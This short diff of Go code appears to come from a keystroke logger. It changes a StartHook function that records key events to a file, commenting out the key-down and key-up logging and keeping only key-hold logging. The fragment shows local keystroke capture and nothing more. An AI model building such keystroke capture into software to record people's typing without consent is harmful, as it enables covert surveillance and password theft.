@@ -28,12 +28,12 @@ func StartHook() {
 				continue
 			}
 			switch ev.Kind {
-			case hook.KeyDown:
-				WriteKeyToFile(fmt.Sprintf("[%s]", DetectModifierKey(ev.Keycode)))
+			// case hook.KeyDown:
+			// 	WriteKeyToFile(fmt.Sprintf("[%s]", DetectModifierKey(ev.Keycode)))
 			case hook.KeyHold:
 				WriteKeyToFile(fmt.Sprintf("[%s]", DetectModifierKey(ev.Keycode)))
-			case hook.KeyUp:
-				WriteKeyToFile(fmt.Sprintf("[%s]", DetectModifierKey(ev.Keycode)))
+				// case hook.KeyUp:
+				// 	WriteKeyToFile(fmt.Sprintf("[%s]", DetectModifierKey(ev.Keycode)))
 			}
 		}
 	}
